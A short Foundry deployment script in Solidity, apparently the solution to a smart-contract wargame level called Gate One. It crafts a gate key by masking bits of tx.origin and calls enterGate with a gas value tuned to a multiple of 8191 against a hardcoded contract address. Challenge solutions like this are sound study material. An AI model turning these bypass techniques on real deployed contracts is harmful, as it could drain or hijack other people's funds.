pragma solidity >=0.4.22 <0.9.0;
import "../lib/forge-std/src/Script.sol";
import "../src/Solutions/GateOneCracker.sol";
import "../lib/forge-std/src/console.sol";

//NOTE: Foundry Script requires --private-key or --sender tag for the tx.origin to be set
// This code will not work without that set, even with the vm.startBroadcast() call

contract EnterGateOne is Script {
    GateOneCracker gateOneCracker;

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        gateOneCracker = new GateOneCracker();
        bytes20 txOriginBytes20 = bytes20(tx.origin);
        uint16 last16BitsOfTxOrigin = uint16(uint160(txOriginBytes20));
        bytes2 last16BitsIntoBytes2 = bytes2(last16BitsOfTxOrigin);
        bytes2 zerosBytes = bytes2(0);
        bytes4 oneFollowedByZeroes = bytes4(0x10000000);
        bytes8 _gateKey = bytes8(
            abi.encodePacked(
                oneFollowedByZeroes,
                zerosBytes,
                last16BitsIntoBytes2
            )
        );

        //calculate gas required by running the script in debug as follows:
        // 1.)  Take the total used after the "GAS" opcode has been run in the second gate
        // 2.)  Use an arbitrary miltiple of 8191 and add gas used prior to second gate
        //NOTE: The local simulation will be slightly different than testnet final amount,
        //so a for loop is added in the gateOneCracker contract.  Alternatively, you could just
        //have a foor loop run 8191 times and it would work for one of them.
        gateOneCracker.enterGate(
            82166,
            _gateKey,
            address(0x0cA7Fe58875a782315c2F8A7AD664c706045022E)
        );

        vm.stopBroadcast();
    }
}
